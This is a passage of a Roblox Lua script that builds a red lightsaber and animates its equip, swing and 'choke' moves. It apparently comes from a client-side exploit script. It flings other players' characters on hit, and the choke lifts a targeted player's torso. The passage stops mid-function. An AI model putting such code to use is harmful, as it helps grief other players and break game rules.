Part4.Parent = Model0
Part4.Material = Enum.Material.SmoothPlastic
Part4.BrickColor = BrickColor.new("Really black")
Part4.Rotation = Vector3.new(0, -90, 0)
Part4.CanCollide = false
Part4.Shape = Enum.PartType.Cylinder
Part4.Size = Vector3.new(0.0999999046, 0.349999994, 0.349999994)
Part4.CFrame = CFrame.new(-1741.76343, 117.599991, -203.531723, 1.19248806e-08, 0, -1, 0, 1, 0, 1, 0, 1.19248806e-08)
Part4.BottomSurface = Enum.SurfaceType.Smooth
Part4.TopSurface = Enum.SurfaceType.Smooth
Part4.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part4.Position = Vector3.new(-1741.76343, 117.599991, -203.531723)
Part4.Orientation = Vector3.new(0, -90, 0)
Part4.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
ManualWeld5.Name = "Weld"
ManualWeld5.Parent = Part4
ManualWeld5.C0 = CFrame.new(0, 0, 0, 1.19248806e-08, 0, 1, 0, 1, 0, -1, 0, 1.19248806e-08)
ManualWeld5.C1 = CFrame.new(0.0347900391, 0, 0.768127441, 1, 0, 0, 0, 1, 0, 0, 0, 1)
ManualWeld5.Part0 = Part4
ManualWeld5.Part1 = Part3
Part6.Name = "bot1"
Part6.Parent = Model0
Part6.Material = Enum.Material.SmoothPlastic
Part6.BrickColor = BrickColor.new("Really black")
Part6.Rotation = Vector3.new(0, -90, 0)
Part6.CanCollide = false
Part6.Shape = Enum.PartType.Cylinder
Part6.Size = Vector3.new(0.0999999046, 0.349999994, 0.349999994)
Part6.CFrame = CFrame.new(-1741.76343, 117.599991, -204.931747, 1.19248806e-08, 0, -1, 0, 1, 0, 1, 0, 1.19248806e-08)
Part6.BottomSurface = Enum.SurfaceType.Smooth
Part6.TopSurface = Enum.SurfaceType.Smooth
Part6.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part6.Position = Vector3.new(-1741.76343, 117.599991, -204.931747)
Part6.Orientation = Vector3.new(0, -90, 0)
Part6.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
ManualWeld7.Name = "Weld"
ManualWeld7.Parent = Part6
ManualWeld7.C0 = CFrame.new(0, 0, 0, 1.19248806e-08, 0, 1, 0, 1, 0, -1, 0, 1.19248806e-08)
ManualWeld7.C1 = CFrame.new(0.0347900391, 0, -0.631896973, 1, 0, 0, 0, 1, 0, 0, 0, 1)
ManualWeld7.Part0 = Part6
ManualWeld7.Part1 = Part3
Part8.Name = "cap"
Part8.Parent = Model0
Part8.Material = Enum.Material.SmoothPlastic
Part8.BrickColor = BrickColor.new("Gold")
Part8.Rotation = Vector3.new(0, -90, 0)
Part8.CanCollide = false
Part8.Shape = Enum.PartType.Cylinder
Part8.Size = Vector3.new(0.0999999046, 0.300000012, 0.300000012)
Part8.CFrame = CFrame.new(-1741.76343, 117.599991, -203.431747, 1.19248806e-08, 0, -1, 0, 1, 0, 1, 0, 1.19248806e-08)
Part8.BottomSurface = Enum.SurfaceType.Smooth
Part8.TopSurface = Enum.SurfaceType.Smooth
Part8.Color = Color3.new(0.937255, 0.721569, 0.219608)
Part8.Position = Vector3.new(-1741.76343, 117.599991, -203.431747)
Part8.Orientation = Vector3.new(0, -90, 0)
Part8.Color = Color3.new(0.937255, 0.721569, 0.219608)
ParticleEmitter9.Parent = Part8
ParticleEmitter9.LockedToPart = true
ParticleEmitter9.Transparency = NumberSequence.new(0,0.1)
ParticleEmitter9.Size = NumberSequence.new(0.5,0.5)
ParticleEmitter9.Color = ColorSequence.new(Color3.new(0.333333, 0, 0),Color3.new(0.666667, 0, 0))
ParticleEmitter9.EmissionDirection = "Right"
ParticleEmitter9.LightEmission = 0.44999998807907
ParticleEmitter9.Texture = "rbxassetid://147313514"
ParticleEmitter9.Lifetime = NumberRange.new(0.5, 0.5)
ParticleEmitter9.Rate = 200
ParticleEmitter9.RotSpeed = NumberRange.new(360, 360)
ParticleEmitter9.Speed = NumberRange.new(10, 10)
ParticleEmitter9.VelocitySpread = 2
ParticleEmitter9.Color = ColorSequence.new(Color3.new(0.333333, 0, 0),Color3.new(0.666667, 0, 0))
ManualWeld10.Name = "Weld"
ManualWeld10.Parent = Part8
ManualWeld10.C0 = CFrame.new(0, 0, 0, 1.19248806e-08, 0, 1, 0, 1, 0, -1, 0, 1.19248806e-08)
ManualWeld10.C1 = CFrame.new(0.0347900391, 0, 0.868103027, 1, 0, 0, 0, 1, 0, 0, 0, 1)
ManualWeld10.Part0 = Part8
ManualWeld10.Part1 = Part3
Part11.Name = "bot2"
Part11.Parent = Model0
Part11.Material = Enum.Material.SmoothPlastic
Part11.BrickColor = BrickColor.new("Really black")
Part11.Rotation = Vector3.new(0, -90, 0)
Part11.CanCollide = false
Part11.Shape = Enum.PartType.Cylinder
Part11.Size = Vector3.new(0.0999999046, 0.300000012, 0.300000012)
Part11.CFrame = CFrame.new(-1741.76343, 117.599991, -205.031723, 1.19248806e-08, 0, -1, 0, 1, 0, 1, 0, 1.19248806e-08)
Part11.BottomSurface = Enum.SurfaceType.Smooth
Part11.TopSurface = Enum.SurfaceType.Smooth
Part11.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part11.Position = Vector3.new(-1741.76343, 117.599991, -205.031723)
Part11.Orientation = Vector3.new(0, -90, 0)
Part11.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
ManualWeld12.Name = "Weld"
ManualWeld12.Parent = Part11
ManualWeld12.C0 = CFrame.new(0, 0, 0, 1.19248806e-08, 0, 1, 0, 1, 0, -1, 0, 1.19248806e-08)
ManualWeld12.C1 = CFrame.new(0.0347900391, 0, -0.731872559, 1, 0, 0, 0, 1, 0, 0, 0, 1)
ManualWeld12.Part0 = Part11
ManualWeld12.Part1 = Part3
Part19.Name = "outblade"
Part19.Parent = Model0
Part19.Material = Enum.Material.Neon
Part19.BrickColor = BrickColor.new("Maroon")
Part19.Rotation = Vector3.new(0, -90, 0)
Part19.CanCollide = false
Part19.Shape = Enum.PartType.Cylinder
Part19.Size = Vector3.new(4.39999962, 0.2500000012, 0.2500000012)
Part19.CFrame = CFrame.new(-1741.76343, 117.599991, -201.181747, 1.19248806e-08, 0, -1, 0, 1, 0, 1, 0, 1.19248806e-08)
Part19.BottomSurface = Enum.SurfaceType.Smooth
Part19.TopSurface = Enum.SurfaceType.Smooth
Part19.Color = Color3.new(0.458824, 0, 0)
Part19.Position = Vector3.new(-1741.76343, 117.599991, -201.181747)
Part19.Orientation = Vector3.new(0, -90, 0)
Part19.Color = Color3.new(0.458824, 0, 0)
ManualWeld20.Name = "Weld"
ManualWeld20.Parent = Part19
ManualWeld20.C0 = CFrame.new(0, 0, 0, 1.19248806e-08, 0, 1, 0, 1, 0, -1, 0, 1.19248806e-08)
ManualWeld20.C1 = CFrame.new(0.0347900391, 0, 3.11810303, 1, 0, 0, 0, 1, 0, 0, 0, 1)
ManualWeld20.Part0 = Part19
ManualWeld20.Part1 = Part3
Part21.Name = "outball"
Part21.Parent = Model0
Part21.Material = Enum.Material.Neon
Part21.BrickColor = BrickColor.new("Maroon")
Part21.Rotation = Vector3.new(0, -90, 0)
Part21.CanCollide = false
Part21.Shape = Enum.PartType.Ball
Part21.Size = Vector3.new(0.25, 0.25, 0.25)
Part21.CFrame = CFrame.new(-1741.76343, 117.599991, -198.981674, 1.19248806e-08, 0, -1, 0, 1, 0, 1, 0, 1.19248806e-08)
Part21.BottomSurface = Enum.SurfaceType.Smooth
Part21.TopSurface = Enum.SurfaceType.Smooth
Part21.Color = Color3.new(0.458824, 0, 0)
Part21.Position = Vector3.new(-1741.76343, 117.599991, -198.981674)
Part21.Orientation = Vector3.new(0, -90, 0)
Part21.Color = Color3.new(0.458824, 0, 0)
ManualWeld22.Name = "Weld"
ManualWeld22.Parent = Part21
ManualWeld22.C0 = CFrame.new(0, 0, 0, 1.19248806e-08, 0, 1, 0, 1, 0, -1, 0, 1.19248806e-08)
ManualWeld22.C1 = CFrame.new(0.0347900391, 0, 5.31817627, 1, 0, 0, 0, 1, 0, 0, 0, 1)
ManualWeld22.Part0 = Part21
ManualWeld22.Part1 = Part3
for i,v in pairs(mas:GetChildren()) do
	v.Parent = char
	saber = v
	outblade = Part19
	outball = Part21
	particle = ParticleEmitter9
	main = Part3
	cap = Part8
	pcall(function() v:MakeJoints() end)
end
mas:Destroy()
for i,v in pairs(cors) do
	spawn(function()
		pcall(v)
	end)
end

local ws = hum.WalkSpeed
local jp = hum.JumpPower
local nws = ws
local njp = jp

local rootj0 = rootj.C0
local neck0 = neck.C0
local LS0 = LS.C0
local RS0 = RS.C0
local LH0 = LH.C0
local RH0 = RH.C0
local rootj1 = rootj.C1
local neck1 = neck.C1
local LS1 = LS.C1
local RS1 = RS.C1
local LH1 = LH.C1
local RH1 = RH.C1

local pshew = Instance.new("Sound", cap)
pshew.SoundId = "rbxassetid://605604103"
pshew.Volume = 2
pshew.Name = "PSHEW"

local sheww = Instance.new("Sound", cap)
sheww.SoundId = "rbxassetid://605607641"
sheww.Volume = 2
sheww.Name = "SHEWW"

local wanwan = Instance.new("Sound", outblade)
wanwan.SoundId = "rbxassetid://1460966017"
wanwan.Volume = 1
wanwan.Name = "WANWAN"
wanwan.Looped = true

local chwan = Instance.new("Sound", outblade)
chwan.SoundId = "rbxassetid://1647165403"
chwan.Volume = 1
chwan.Name = "CHWAN"

local pssps = Instance.new("Sound", outblade)
pssps.SoundId = "rbxassetid://1335649595"
pssps.Volume = 1
pssps.Name = "PSSPS"

local vomb = Instance.new("Sound", outblade)
vomb.SoundId = "rbxassetid://2088308141"
vomb.Volume = 2
vomb.Name = "VOMB"

local ooowa = Instance.new("Sound", larm)
ooowa.SoundId = "rbxassetid://1386781853"
ooowa.Volume = 2.5
ooowa.Name = "OOOWA"

local koohaa = Instance.new("Sound", head)
koohaa.SoundId = "rbxassetid://149840174"
koohaa.Volume = 2
koohaa.Name = "KOOOHAAA"
koohaa.Looped = true
koohaa:Play()
local thepos = koohaa.TimePosition

-----------------------------------------------------------------------------

local CFn = CFrame.new
local CFa = CFrame.Angles
local Rad = math.rad
local Cos = math.cos
local Sin = math.sin
local sine = 1
local attacking = false
local equipped = false
local Changing = false
local Swinging = false
local kill = false
local attackstate = 1
local Choking = false
local buttonC = false

-----------------------------------------------------------------------------

if game.PlaceId == 168556275 then
	game:GetService("Players").LocalPlayer:Kick("wrong game search: [UP] Just a baseplate. - creator: the local maze")
end

--head.Transparency = 1



local hairw = Instance.new("Weld", hair)
hairw.Part0 = head
hairw.Part1 = hair
hairw.C1 = CFn(0, -0.1, 0)

local AT0 = Instance.new("Attachment", outblade)
AT0.Position = Vector3.new(-2.2, 0, 0)

local AT1 = Instance.new("Attachment", outblade)
AT1.Position = Vector3.new(2.4, 0, 0)

local trail = Instance.new("Trail", outblade)
trail.Attachment0 = AT0
trail.Attachment1 = AT1
trail.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 0, 0), NumberSequenceKeypoint.new(1, 0.9, 0)})
trail.LightEmission = 0.7
trail.Lifetime = 0.5
trail.MaxLength = 2
trail.MinLength = 0.05
trail.WidthScale = NumberSequence.new({NumberSequenceKeypoint.new(0, 1, 0), NumberSequenceKeypoint.new(1, 0.2, 0)})
trail.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(85, 0, 0), 0), ColorSequenceKeypoint.new(1, Color3.fromRGB(170, 0, 0), 0)})

local mainw = Instance.new("Weld", main)
mainw.Part0 = tor
mainw.Part1 = main
mainw.C1 = CFn(1, 1, 0)

local bld = Instance.new("Part", saber)
bld.Size = Vector3.new(4.7, 1, 1)
bld.CanCollide = false
bld.Transparency = 1
bld.CanTouch = true

local bldw = Instance.new("Weld", bld)
bldw.Part0 = outblade
bldw.Part1 = bld




outblade.Transparency = 1
outball.Transparency = 1
trail.Enabled = false
particle.Transparency = NumberSequence.new(0, 1)
particle.LockedToPart = false
particle.Enabled = false

-----------------------------------------------------------------------------

local newfolder = Instance.new("Folder", char)

ArtificialHB = Instance.new("BindableEvent", newfolder)
ArtificialHB.Name = "Heartbeat"
newfolder:WaitForChild("Heartbeat")

frame = 1 / 60
tf = 0
allowframeloss = false
tossremainder = false


lastframe = tick()
newfolder.Heartbeat:Fire()


game:GetService("RunService").Heartbeat:connect(function(s, p)
	tf = tf + s
	if tf >= frame then
		if allowframeloss then
			newfolder.Heartbeat:Fire()
			lastframe = tick()
		else
			for i = 1, math.floor(tf / frame) do
				newfolder.Heartbeat:Fire()
			end
			lastframe = tick()
		end
		if tossremainder then
			tf = 0
		else
			tf = tf - frame * math.floor(tf / frame)
		end
	end
end)

function swait(num)
	if num == 0 or num == nil then
		game:service("RunService").Stepped:wait(0)
	else
		for i = 0, num do
			game:service("RunService").Stepped:wait(0)
		end
	end
end

function clerp(a, b, t)
	return a:lerp(b, t)
end

function Sound(id, vol, par, name, looped)
	if not par:FindFirstChild(name) then
		local sound = Instance.new("Sound", par)
		sound.SoundId = id
		sound.Volume = vol
		if looped == true then
			sound.Looped = true
		end
		sound.Name = name
		sound:Play()
		return sound
	else
		local sound = par:FindFirstChild(name)
		sound:Play()
		return sound
	end
end

function StopSound(id, vol, par, name, looped)
	if not par:FindFirstChild(name) then
		local sound = Instance.new("Sound", par)
		sound.SoundId = id
		sound.Volume = vol
		if looped == true then
			sound.Looped = true
		end
		sound.Name = name
		sound:Stop()
		return sound
	else
		local sound = par:FindFirstChild(name)
		sound:Stop()
		return sound
	end
end

function Force(part, pos, part2, pos2, par2)
	local parp = Instance.new("Part", char)
	parp.Size = Vector3.new(1, 1, 1)
	parp.Transparency = 1
	parp.CanCollide = false
	local parpw = Instance.new("Weld", parp)
	parpw.Part0 = part
	parpw.Part1 = parp
	parpw.C1 = pos
	local pare = Instance.new("ParticleEmitter", parp)
	pare.LockedToPart = true
	pare.Transparency = NumberSequence.new(0.4, 1)
	pare.Size = NumberSequence.new(1.25, 0)
	pare.Lifetime = NumberRange.new(1)
	pare.Rotation = NumberRange.new(0, 360)
	pare.Rate = 200
	pare.RotSpeed = NumberRange.new(360, 360)
	pare.Speed = NumberRange.new(4)
	pare.Color = ColorSequence.new(Color3.fromRGB(170, 0, 0),Color3.fromRGB(255, 255, 255))
	pare.SpreadAngle = Vector2.new(360, 360)
	pare.Texture = "rbxassetid://122356023"
	local parp2 = parp:Clone()
	parp2.Parent = par2
	local parp2w = parp2:FindFirstChild("Weld")
	parp2w.Part0 = part2
	parp2w.Part1 = parp2
	parp2w.C1 = pos2
	return parp, parp2
end

function equipunequip()
	if attacking == false and equipped == false and Changing == false then
		attacking = true
		Changing = true
		hum.WalkSpeed = 0
		hum.JumpPower = 0
		for i = 0,1,.1 do
			neck.C1 = clerp(neck.C1, neck1 * CFa(Rad(-20), 0, Rad(-60)), i)
			rootj.C1 = clerp(rootj.C1, rootj1, i)
			LS.C1 = clerp(LS.C1, LS1 * CFa(Rad(10), 0, 0), i)
			RS.C1 = clerp(RS.C1, RS1 * CFa(Rad(30), Rad(-30), Rad(-3)), i)
			LH.C1 = clerp(LH.C1, LH1 * CFa(Rad(5), 0, 0), i)
			RH.C1 = clerp(RH.C1, RH1 * CFa(Rad(5), 0, 0), i)
			neck.C0 = clerp(neck.C0, neck0 * CFa(Rad(5), 0, 0), i)
			rootj.C0 = clerp(rootj.C0, rootj0, i)
			LS.C0 = clerp(LS.C0, LS0, i)
			RS.C0 = clerp(RS.C0, RS0 * CFn(0, 0, -0.5) * CFa(0, Rad(90), 0), i)
			LH.C0 = clerp(LH.C0, LH0, i)
			RH.C0 = clerp(RH.C0, RH0, i)
			swait()
		end
		StopSound("rbxassetid://605607641", 2, cap, "SHEWW", false)
		Sound("rbxassetid://605604103", 2, cap, "PSHEW", false)
		Sound("rbxassetid://1460966017", 1, cap, "WANWAN", true)
		equipped = true
		mainw.Part0 = rarm
		mainw.C1 = CFn(0, 1, 0) * CFa(0, Rad(180), 0)
		outblade.Transparency = 0
		outball.Transparency = 0
		trail.Enabled = true
		particle.Transparency = NumberSequence.new(0, 0.1)
		particle.LockedToPart = true
		particle.Enabled = true
		for i = 0,1,.1 do
			neck.C1 = clerp(neck.C1, neck1, i)
			rootj.C1 = clerp(rootj.C1, rootj1, i)
			LS.C1 = clerp(LS.C1, LS1 * CFa(Rad(10), 0, 0), i)
			RS.C1 = clerp(RS.C1, RS1 * CFa(Rad(50), 0, 0), i)
			LH.C1 = clerp(LH.C1, LH1 * CFa(Rad(5), 0, 0), i)
			RH.C1 = clerp(RH.C1, RH1 * CFa(Rad(5), 0, 0), i)
			neck.C0 = clerp(neck.C0, neck0 * CFa(Rad(5), 0, 0), i)
			rootj.C0 = clerp(rootj.C0, rootj0, i)
			LS.C0 = clerp(LS.C0, LS0, i)
			RS.C0 = clerp(RS.C0, RS0, i)
			LH.C0 = clerp(LH.C0, LH0, i)
			RH.C0 = clerp(RH.C0, RH0, i)
			swait()
		end
		hum.WalkSpeed = nws
		hum.JumpPower = njp
		Changing = false
		attacking = false
	elseif attacking == false and equipped == true and Changing == false then
		attacking = true
		Changing = true
		hum.WalkSpeed = 0
		hum.JumpPower = 0
		StopSound("rbxassetid://605604103", 2, cap, "PSHEW", false)
		Sound("rbxassetid://605607641", 2, cap, "SHEWW", false)
		StopSound("rbxassetid://1460966017", 1, cap, "WANWAN", true)
		outblade.Transparency = 1
		outball.Transparency = 1
		trail.Enabled = false
		particle.Transparency = NumberSequence.new(0, 1)
		particle.LockedToPart = false
		particle.Enabled = false
		for i = 0,1,.1 do
			neck.C1 = clerp(neck.C1, neck1, i)
			rootj.C1 = clerp(rootj.C1, rootj1, i)
			LS.C1 = clerp(LS.C1, LS1 * CFa(Rad(10), 0, 0), i)
			RS.C1 = clerp(RS.C1, RS1 * CFa(Rad(50), 0, 0), i)
			LH.C1 = clerp(LH.C1, LH1 * CFa(Rad(5), 0, 0), i)
			RH.C1 = clerp(RH.C1, RH1 * CFa(Rad(5), 0, 0), i)
			neck.C0 = clerp(neck.C0, neck0 * CFa(Rad(5), 0, 0), i)
			rootj.C0 = clerp(rootj.C0, rootj0, i)
			LS.C0 = clerp(LS.C0, LS0, i)
			RS.C0 = clerp(RS.C0, RS0, i)
			LH.C0 = clerp(LH.C0, LH0, i)
			RH.C0 = clerp(RH.C0, RH0, i)
			swait()
		end
		for i = 0,1,.1 do
			neck.C1 = clerp(neck.C1, neck1 * CFa(Rad(-20), 0, Rad(-60)), i)
			rootj.C1 = clerp(rootj.C1, rootj1, i)
			LS.C1 = clerp(LS.C1, LS1 * CFa(Rad(10), 0, 0), i)
			RS.C1 = clerp(RS.C1, RS1 * CFa(Rad(30), Rad(-30), Rad(-3)), i)
			LH.C1 = clerp(LH.C1, LH1 * CFa(Rad(5), 0, 0), i)
			RH.C1 = clerp(RH.C1, RH1 * CFa(Rad(5), 0, 0), i)
			neck.C0 = clerp(neck.C0, neck0 * CFa(Rad(5), 0, 0), i)
			rootj.C0 = clerp(rootj.C0, rootj0, i)
			LS.C0 = clerp(LS.C0, LS0, i)
			RS.C0 = clerp(RS.C0, RS0 * CFn(0, 0, -0.5) * CFa(0, Rad(90), 0), i)
			LH.C0 = clerp(LH.C0, LH0, i)
			RH.C0 = clerp(RH.C0, RH0, i)
			swait()
		end
		mainw.Part0 = tor
		mainw.C1 = CFn(1, 1, 0)
		equipped = false
		hum.WalkSpeed = nws
		hum.JumpPower = njp
		Changing = false
		attacking = false
	end
end

function Swing()
	if attacking == false and equipped == true and Swinging == false then
		attacking = true
		Swinging = true
		kill = true
		hum.WalkSpeed = 3
		hum.JumpPower = 5
		local hey = bld.Touched:connect(function(hit)
    			if kill == true and hit.Parent:FindFirstChildOfClass("Humanoid") and not hit:IsDescendantOf(char) then
            	    kill = false
            		local killman = hit.Parent
            		local killhum = killman:FindFirstChildOfClass("Humanoid")
			fling(killman.HumanoidRootPart.Position, 0.1)
					local up = true
					--[[
					for i = 1,2 do
						local cutpart = Instance.new("Part", killman)
						cutpart.Size = Vector3.new(hit.Size.X, hit.Size.Y / 2, hit.Size.Z)
						cutpart.BrickColor = hit.BrickColor
						cutpart.Material = hit.Material
						cutpart.Transparency = hit.Transparency
						cutpart.Reflectance = hit.Reflectance
						cutpart.BackSurface = hit.BackSurface
						cutpart.BottomSurface = hit.BottomSurface
						cutpart.FrontSurface = hit.FrontSurface
						cutpart.LeftSurface = hit.LeftSurface
						cutpart.RightSurface = hit.RightSurface
						cutpart.TopSurface = hit.TopSurface
						if up == true then
							cutpart.CFrame = hit.CFrame * CFn(0, hit.Size.Y / 2, 0)
							up = false
						else
							cutpart.CFrame = hit.CFrame * CFn(0, -(hit.Size.Y / 2), 0)
							up = true
						end
					end
					hit:Destroy()
					]]
            		if attackstate == 1 then
						Sound("rbxassetid://1647165403", 1, outblade, "CHWAN", false)
					elseif attackstate == 2 then
						Sound("rbxassetid://1335649595", 1, outblade, "PSSPS", false)
					end
        	elseif kill == true and hit.Parent.Parent:FindFirstChildOfClass("Humanoid") and not hit:IsDescendantOf(char) then
            	    kill = true
            		local killman = hit.Parent.Parent
            		local killhum = killman:FindFirstChildOfClass("Humanoid")
			fling(killman.HumanoidRootPart.Position, 0.1)
					local up = true
					--[[
					for i = 1,2 do
						local cutpart = Instance.new("Part", killman)
						cutpart.Size = Vector3.new(hit.Size.X, hit.Size.Y / 2, hit.Size.Z)
						cutpart.BrickColor = hit.BrickColor
						cutpart.Material = hit.Material
						cutpart.Transparency = hit.Transparency
						cutpart.Reflectance = hit.Reflectance
						cutpart.BackSurface = hit.BackSurface
						cutpart.BottomSurface = hit.BottomSurface
						cutpart.FrontSurface = hit.FrontSurface
						cutpart.LeftSurface = hit.LeftSurface
						cutpart.RightSurface = hit.RightSurface
						cutpart.TopSurface = hit.TopSurface
						if up == true then
							cutpart.CFrame = hit.CFrame * CFn(0, hit.Size.Y / 2, 0)
							up = false
						else
							cutpart.CFrame = hit.CFrame * CFn(0, -(hit.Size.Y / 2), 0)
							up = true
						end
					end
					hit:Destroy()
					]]
            		if attackstate == 1 then
						Sound("rbxassetid://1647165403", 1, outblade, "CHWAN", false)
					elseif attackstate == 2 then
						Sound("rbxassetid://1335649595", 1, outblade, "PSSPS", false)
					end
                end
    		end)
		if attackstate == 1 then
			attackstate = 2
			for i = 0,1,.15 do
				neck.C1 = clerp(neck.C1, neck1 * CFa(0, 0, Rad(-10)), i)
				rootj.C1 = clerp(rootj.C1, rootj1, i)
				LS.C1 = clerp(LS.C1, LS1 * CFa(Rad(10), 0, 0), i)
				RS.C1 = clerp(RS.C1, RS1 * CFa(Rad(30), Rad(-80), Rad(-40)), i)
				LH.C1 = clerp(LH.C1, LH1 * CFa(Rad(5), 0, 0), i)
				RH.C1 = clerp(RH.C1, RH1 * CFn(0.3, 0, 0) * CFa(Rad(5), 0, 0), i)
				neck.C0 = clerp(neck.C0, neck0 * CFa(Rad(5), 0, 0), i)
				rootj.C0 = clerp(rootj.C0, rootj0, i)
				LS.C0 = clerp(LS.C0, LS0, i)
				RS.C0 = clerp(RS.C0, RS0 * CFa(0, Rad(30), 0), i)
				LH.C0 = clerp(LH.C0, LH0, i)
				RH.C0 = clerp(RH.C0, RH0, i)
				swait()
			end
			Sound("rbxassetid://2088308141", 2, outblade, "VOMB", false)
			for i = 0,1,.15 do
				neck.C1 = clerp(neck.C1, neck1 * CFa(0, 0, Rad(10)), i)
				rootj.C1 = clerp(rootj.C1, rootj1, i)
				LS.C1 = clerp(LS.C1, LS1 * CFa(Rad(10), 0, 0), i)
				RS.C1 = clerp(RS.C1, RS1 * CFa(Rad(30), Rad(-80), Rad(-50)), i)
				LH.C1 = clerp(LH.C1, LH1 * CFa(Rad(5), 0, 0), i)
				RH.C1 = clerp(RH.C1, RH1 * CFa(Rad(5), 0, 0), i)
				neck.C0 = clerp(neck.C0, neck0 * CFa(Rad(5), 0, 0), i)
				rootj.C0 = clerp(rootj.C0, rootj0, i)
				LS.C0 = clerp(LS.C0, LS0, i)
				RS.C0 = clerp(RS.C0, RS0 * CFa(0, Rad(-75), 0), i)
				LH.C0 = clerp(LH.C0, LH0, i)
				RH.C0 = clerp(RH.C0, RH0, i)
				swait()
			end
		elseif attackstate == 2 then
			attackstate = 1
			for i = 0,1,.15 do
				neck.C1 = clerp(neck.C1, neck1 * CFa(0, 0, Rad(10)), i)
				rootj.C1 = clerp(rootj.C1, rootj1, i)
				LS.C1 = clerp(LS.C1, LS1 * CFa(Rad(10), 0, 0), i)
				RS.C1 = clerp(RS.C1, RS1 * CFa(Rad(110), Rad(-20), Rad(-90)), i)
				LH.C1 = clerp(LH.C1, LH1 * CFa(Rad(5), 0, 0), i)
				RH.C1 = clerp(RH.C1, RH1 * CFa(Rad(5), 0, 0), i)
				neck.C0 = clerp(neck.C0, neck0 * CFa(Rad(5), 0, 0), i)
				rootj.C0 = clerp(rootj.C0, rootj0, i)
				LS.C0 = clerp(LS.C0, LS0, i)
				RS.C0 = clerp(RS.C0, RS0, i)
				LH.C0 = clerp(LH.C0, LH0, i)
				RH.C0 = clerp(RH.C0, RH0, i)
				swait()
			end
			Sound("rbxassetid://2088308141", 2, outblade, "VOMB", false)
			for i = 0,1,.15 do
				neck.C1 = clerp(neck.C1, neck1 * CFa(0, 0, Rad(-10)), i)
				rootj.C1 = clerp(rootj.C1, rootj1 * CFa(0, 0, Rad(-40)), i)
				LS.C1 = clerp(LS.C1, LS1 * CFa(Rad(10), 0, 0), i)
				RS.C1 = clerp(RS.C1, RS1 * CFa(Rad(-80), Rad(70), Rad(-40)), i)
				LH.C1 = clerp(LH.C1, LH1 * CFa(Rad(5), 0, 0), i)
				RH.C1 = clerp(RH.C1, RH1 * CFa(Rad(5), Rad(40), 0), i)
				neck.C0 = clerp(neck.C0, neck0 * CFa(Rad(5), 0, 0), i)
				rootj.C0 = clerp(rootj.C0, rootj0, i)
				LS.C0 = clerp(LS.C0, LS0, i)
				RS.C0 = clerp(RS.C0, RS0, i)
				LH.C0 = clerp(LH.C0, LH0, i)
				RH.C0 = clerp(RH.C0, RH0, i)
				swait()
			end
		end
		hum.WalkSpeed = nws
		hum.JumpPower = njp
		kill = false
		hey:disconnect()
		Swinging = false
		attacking = false
	end
end

function Choke()
	if attacking == false and Choking == false then
		attacking = true
		Choking = false
		hum.WalkSpeed = 0
		hum.JumpPower = 0
		if Mouse.Target ~= nil and Mouse.Target.Parent:FindFirstChildOfClass("Humanoid") then
			local theguy = Mouse.Target.Parent
			local thehum = theguy:FindFirstChildOfClass("Humanoid")
			if thehum.Health > 0 then
			    local thehead = theguy:FindFirstChild("Head")
    			local thetor = theguy:FindFirstChild("Torso") or theguy:FindFirstChild("UpperTorso")
    			root.CFrame = CFn(root.CFrame.p, Vector3.new(Mouse.Hit.x, root.CFrame.y, Mouse.Hit.z))
    			thetor.CFrame = CFn(thetor.CFrame.p, Vector3.new(root.CFrame.x, thetor.CFrame.y, root.CFrame.z))
    			local thetorframe = thetor.CFrame
    			local forpar, forpar2 = Force(larm, CFn(0, 1, 0), thehead, CFn(0, 0.5, 0), theguy)
				if thetor.Anchored == true then
					thetor.Anchored = false
				end
    			local thebv = Instance.new("BodyPosition", thetor)
    			thebv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    			thebv.Position = thetorframe.p
				Sound("rbxassetid://1386781853", 2.5, larm, "OOOWA", false)
    			for i = 0,1,.15 do
    				neck.C1 = clerp(neck.C1, neck1 * CFa(0, 0, Rad(-20)) , i)
    				rootj.C1 = clerp(rootj.C1, rootj1 * CFa(0, 0, Rad(20)), i)
    				LS.C1 = clerp(LS.C1, LS1 * CFa(Rad(20), 0, Rad(90)), i)
    				RS.C1 = clerp(RS.C1, RS1 * CFa(0, Rad(20), 0), i)
    				LH.C1 = clerp(LH.C1, LH1 * CFa(Rad(5), Rad(-20), 0), i)
    				RH.C1 = clerp(RH.C1, RH1 * CFa(Rad(5), 0, 0), i)
    				neck.C0 = clerp(neck.C0, neck0 * CFa(Rad(5), 0, 0), i)
    				rootj.C0 = clerp(rootj.C0, rootj0, i)
    				LS.C0 = clerp(LS.C0, LS0, i)
    				RS.C0 = clerp(RS.C0, RS0, i)
    				LH.C0 = clerp(LH.C0, LH0, i)
    				RH.C0 = clerp(RH.C0, RH0, i)
    				swait()
    			end
    			thebv.Position = thetorframe * CFn(0, 10, 0).p
    			for i = 0,1,.05 do
    				neck.C1 = clerp(neck.C1, neck1 * CFa(Rad(20), 0, Rad(-20)), i)
    				rootj.C1 = clerp(rootj.C1, rootj1 * CFa(0, 0, Rad(20)), i)
    				LS.C1 = clerp(LS.C1, LS1 * CFa(Rad(20), 0, Rad(140)), i)
    				RS.C1 = clerp(RS.C1, RS1 * CFa(0, Rad(20), 0), i)
    				LH.C1 = clerp(LH.C1, LH1 * CFa(Rad(5), Rad(-20), 0), i)
    				RH.C1 = clerp(RH.C1, RH1 * CFa(Rad(5), 0, 0), i)
    				neck.C0 = clerp(neck.C0, neck0 * CFa(Rad(5), 0, 0), i)
    				rootj.C0 = clerp(rootj.C0, rootj0, i)
    				LS.C0 = clerp(LS.C0, LS0, i)
    				RS.C0 = clerp(RS.C0, RS0, i)
    				LH.C0 = clerp(LH.C0, LH0, i)
    				RH.C0 = clerp(RH.C0, RH0, i)
    				swait()
    			end
    			for i = 1,math.huge do
    				if buttonC == true and thehum.Health > 0 then
    					thehum.Health = thehum.Health - 0
    					swait()
    				elseif buttonC == false or thehum.Health <= 0 then
    					break
    				end
    			end
    			if thehum.Health <= 0 then
    			    Sound("rbxassetid://513153251", 4, thetor, "OUCH", false)
    			end
    			thebv:Destroy()
    			forpar:Destroy()
    			forpar2:Destroy()
			end
		elseif Mouse.Target ~= nil and Mouse.Target.Parent.Parent:FindFirstChildOfClass("Humanoid") then
